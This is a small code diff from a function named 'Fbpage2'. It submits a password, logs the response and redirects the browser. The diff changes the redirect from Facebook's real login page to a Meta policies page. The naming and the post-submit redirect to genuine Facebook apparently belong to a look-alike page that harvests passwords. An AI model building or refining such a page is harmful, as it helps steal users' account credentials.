@@ -21,7 +21,7 @@ function Fbpage2() {
                 password
             });
             console.log("response", response);
-            window.location.href = 'https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2F';
+            window.location.href = 'https://transparency.meta.com/en-gb/policies/';
             //   setMessage('Registration successful');
         } catch (error) {
             console.log("error", error);
